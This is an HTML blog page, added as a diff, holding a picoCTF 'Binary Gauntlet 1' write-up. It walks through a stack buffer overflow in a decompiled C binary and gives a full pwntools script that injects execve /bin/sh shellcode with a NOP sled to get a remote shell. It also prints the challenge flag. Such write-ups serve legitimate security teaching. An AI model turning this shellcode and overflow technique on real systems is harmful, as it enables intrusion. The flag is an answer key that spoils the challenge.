@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+
+<html lang="en" xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title>My Blog - 2021-03-picoCTF - binary-gauntlet-1</title>
+
+    <!-- Meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="author" content="Abraxus">
+    <!-- FontAwesome JS-->
+    <script defer src="../../assets/js/fontawesome.min.js"></script>
+
+    <!-- Theme CSS -->
+    <link id="theme-style" rel="stylesheet" href="../../assets/css/style.css">
+</head>
+<body class="theme-bg-light">
+
+    <header class="header text-center">
+    <h1 class="blog-name pt-lg-4 mb-0"><a class="no-text-decoration" href="index.html">Abraxus's Blog</a></h1>
+
+    <nav class="navbar navbar-expand-lg navbar-dark">
+
+        <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navigation" aria-controls="navigation" aria-expanded="false" aria-label="Toggle navigation">
+            <span class="navbar-toggler-icon"></span>
+        </button>
+
+        <div id="navigation" class="collapse navbar-collapse flex-column">
+            <div class="profile-section pt-3 pt-lg-0">
+                <img class="profile-image mb-3 rounded-circle mx-auto" src="../../assets/images/profile.png" alt="image">
+
+                <div class="bio mb-3">Student<br>REV @ K3RN3L4RMY</div><!--//bio-->
+                <ul class="social-list list-inline py-3 mx-auto">
+                    <li class="list-inline-item"><a href="" target="_blank"><i class="fab fa-twitter fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://github.com/Kasimir123" target="_blank"><i class="fab fa-github-alt fa-fw"></i></a></li>
+                    <li class="list-inline-item"><a href="https://www.linkedin.com/in/kasimir-schulz" target="_blank"><i class="fab fa-linkedin-in fa-fw"></i></a></li>
+                </ul><!--//social-list-->
+                <hr>
+            </div><!--//profile-section-->
+
+            <ul class="navbar-nav flex-column text-center">
+                <li class="nav-item">
+                    <a class="nav-link" href="../../index.html"><i class="fas fa-home fa-fw me-2"></i>Blog Home <i class="fas fa-home fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../about.html"><i class="fas fa-user fa-fw me-2"></i>About Me <i class="fas fa-user fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../blog-posts.html"><i class="fas fa-bookmark fa-fw me-2"></i>Blog Posts <i class="fas fa-bookmark fa-fw me-2"></i></a>
+                </li>
+                <li class="nav-item">
+                    <a class="nav-link" href="../../writeups.html"><i class="fas fa-flag fa-fw me-2"></i>Writeups <i class="fas fa-flag fa-fw me-2"></i></a>
+                </li>
+            </ul>
+
+            <div class="my-2 my-md-3 text-center">
+                <a class="btn btn-primary" href="https://github.com/Kasimir123" target="_blank">Get in Touch</a>
+            </div>
+        </div>
+    </nav>
+</header>
+
+    <div class="main-wrapper">
+
+        <article class="markdown-section my-5 mx-5">
+            <h1 id="picoctf-binary-gauntlet-1-write-up">picoCTF Binary Gauntlet 1 Write Up</h1>
+<h2 id="details">Details:</h2>
+<p>Points: 30</p>
+<p>Jeopardy style CTF</p>
+<p>Category: Binary Exploitation</p>
+<p>Comments: Okay, time for a challenge. gauntlet nc mercury.picoctf.net 19968</p>
+<h2 id="write-up">Write up:</h2>
+<p>Opening up the file in a decompiler we see the main function:</p>
+<div class="lang-c editor-colors"><div style="color:Black;background-color:White;"><pre>
+<span style="color:Blue;">int</span> __cdecl main(<span style="color:Blue;">int</span> argc, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **argv, <span style="color:Blue;">const</span> <span style="color:Blue;">char</span> **envp)
+{
+  <span style="color:Blue;">char</span> dest[104]; 
+  <span style="color:Blue;">char</span> *s;
+
+  s = (<span style="color:Blue;">char</span> *)malloc(1000uLL);
+  printf(<span style="color:#A31515;">&quot;%p\n&quot;</span>, dest);
+  fflush(_bss_start);
+  fgets(s, 1000, stdin);
+  s[999] = 0;
+  printf(s);
+  fflush(_bss_start);
+  fgets(s, 1000, stdin);
+  s[999] = 0;
+  strcpy(dest, s);
+  <span style="color:Blue;">return</span> 0;
+}
+</pre></div>
+</div>
+<p>I noticed almost immediately that the vulnerability was a buffer overflow since we were copying a 999 character string to a 103 character string.</p>
+<p>There were no references of the flag in the program so I knew that I would need to get shell access to the machine the program was running on.</p>
+<p>First I checked the security on the binary:</p>
+<pre><code>checksec --file=gauntlet                             
+
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable      FILE
+Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67) Symbols       No    0               3gauntlet
+</code></pre>
+<p>I saw that NX was disabled which meant that the stack was executable. They gave us the address of dest which was a fairly big hint.</p>
+<p>At this point my plan of attack was to write the shellcode to dest and then do a buffer overflow so that I could overwrite where the return goes to.</p>
+<p>I used cyclic from pwntools to generate a pattern and saw that after 120 characters we would need to write the address we wanted to go to. I then created the following python script:</p>
+<div class="lang-python editor-colors"># import pwn tools
+from pwn import *
+
+# open remote process
+r = remote('mercury.picoctf.net', 19968)
+
+# get the line with the address
+address = r.recvline() 
+
+# turn address into an int so we can add later on
+address = int(address[:-1], 16)
+
+# send arbitrary text
+r.send('boo\n')
+
+# get the next line
+r.recvline()
+
+# 64 bit shellcode
+shellcode = b'\x50\x48\x31\xd2\x48\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05'
+
+# 96 nops for the nop slide
+NOPS = b'\x90'*96
+
+# craft payload
+payload = shellcode + NOPS + p64(address)
+
+# send payload
+r.send(payload + b'\n')
+
+# get interactive mode
+r.interactive()
+</div>
+<p>Running the script I got:</p>
+<pre><code>[+] Opening connection to mercury.picoctf.net on port 19968: Done
+[*] Switching to interactive mode
+
+$ ls
+flag.txt
+gauntlet
+gauntlet_no_aslr
+xinet_startup.sh
+
+$ cat flag.txt
+7504344981b9288c5669150ada84894e
+</code></pre>
+<p>The flag was:</p>
+<pre><code>7504344981b9288c5669150ada84894e
+</code></pre>
+
+        </article>
+
+        <footer class="footer text-left py-2 theme-bg-dark">
+
+    <small class="copyright">&nbsp;Generated by <a href="https://github.com/Kasimir123/Blog-Generator" target="_blank">Blog Generator</a> from Kasimir123</small>
+
+</footer>
+
+    </div><!--//main-wrapper-->
+    <!-- Javascript -->
+    <script src="../../assets/js/popper.min.js"></script>
+    <script src="../../assets/js/bootstrap.min.js"></script>
+</body>
+</html>
